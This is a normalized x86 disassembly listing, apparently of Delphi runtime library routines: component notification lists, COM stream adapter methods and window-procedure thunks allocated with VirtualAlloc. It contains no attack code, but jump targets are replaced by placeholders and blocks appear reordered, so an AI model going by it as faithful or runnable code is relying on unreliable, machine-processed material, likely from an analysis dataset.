test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403744
lea eax [ ebx + 0x14 ]
call sub_40d7a0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_41b654
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_423b78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41b6b0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41b4f8
mov edx ebx
mov eax esi
call sub_423b78
sub_423c0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41b4f8
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x10 ] eax
sub_423c38
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41b7f0
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403390
xor eax eax
mov [ ebx + 0x10 ] eax
sub_423c60
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40358c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_423c0c
mov dl 0x1
mov eax ebx
call sub_424180
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_424130
sub_423cb8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_424180
mov edx ebx
mov eax esi
call sub_423c38
pop edi
pop esi
pop ebx
retn
sub_423cf0
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41b73c
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_423cb8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_423c38
sub_423d48
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41b654
call sub_423d48
inc edi
dec esi
jne r-xdata
sub_423d84
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41b7f0
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403390
xor eax eax
mov [ ebx + 0x14 ] eax
sub_423da8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_423d84
mov edx ebx
mov eax esi
call sub_423d84
pop esi
pop ebx
retn
sub_423dc4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_423da8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41b654
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_423e20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_423bcc
push ebx
push sub_423bf4
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_423be0
push ebx
push sub_423c00
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_423f18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408224
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_423fb0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
sub_423fb0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_41b654
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408224
test al al
jne r-xdata
sub_424000
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40452c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408510
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
xor edx edx
mov eax ebx
call sub_424180
mov edx esi
mov eax ebx
call sub_42408c
mov dl 0x1
mov eax ebx
call sub_424180
sub_4240a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41b654
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41b5e0
sub_4240dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41b6b0
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41b544
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41b6d0
sub_424130
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4240cc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4240a0
mov cl 0x1
mov edx ebx
call sub_424130
inc edi
dec ebp
jne r-xdata
sub_424180
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4043bc
mov edx esp
mov eax esi
call sub_4036a4
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4241c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4241f0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_424238
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_424278
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_424298
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4242bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_424304
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
mov edx esi
call sub_424534
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42436c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_424534
mov edx ebx
mov eax esi
call sub_424528
sub_4243b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4243f4
push ebx
push esi
push edi
call sub_40375c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423af4
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_423da8
jmp r-xdata
mov eax esi
call sub_41b73c
mov edx eax
mov eax edi
call sub_424534
lea eax [ edi + 0x50 ]
call sub_40d7a0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_424454
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_423dc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_424480
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_42449c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4244b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_41b654
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_424534
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41b544
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41b654
cmp ebp eax
jne r-xdata
sub_424574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_423da8
mov edx ebx
call sub_423b78
sub_4245a0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4245e8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403390
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_424620
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42466f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_424688
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_4246d7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4246f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42475a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_424774
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4247bd
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41dc28
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4247d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405bc4
xor eax eax
push ebp
push sub_4249c5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_42499e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4027b4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42498d
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027d4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4249cc
lea eax [ ebp + 0xc ]
call sub_405b50
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_424a08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_424a6b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_424a9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_41ba18
mov edi eax
xor eax eax
push ebp
push sub_424af1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424af8
mov eax [ rw-data ]
call sub_41ba7c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41b654
call sub_403390
inc esi
dec ebx
jne r-xdata
sub_424b10
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_424b38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4029b0
mov edx sub_424b10
lea eax [ esi + 0x5 ]
call sub_424b30
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_424b30
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_424bf4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406f28
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424b38
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_424ca8
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_424bd0
sub_424cd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424d74
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d7b
retn
mov eax [ rw-data ]
call sub_41ac3c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_424a9c
xor edx edx
xor eax eax
call sub_41eb78
mov eax rw-data
call sub_40d7a0
call sub_40629c
lea eax [ eax + 0xc ]
call sub_40d7a0
mov eax rw-data
call sub_40d7a0
mov eax rw-data
call sub_405b50
mov eax sub_424b08
call sub_4059ec
mov eax rw-data
call sub_40d7a0
call sub_4238c8
mov eax rw-data
call sub_40d7a0
mov eax rw-data
call sub_405b50
sub_424d80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424e09
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e10
retn
call sub_423894
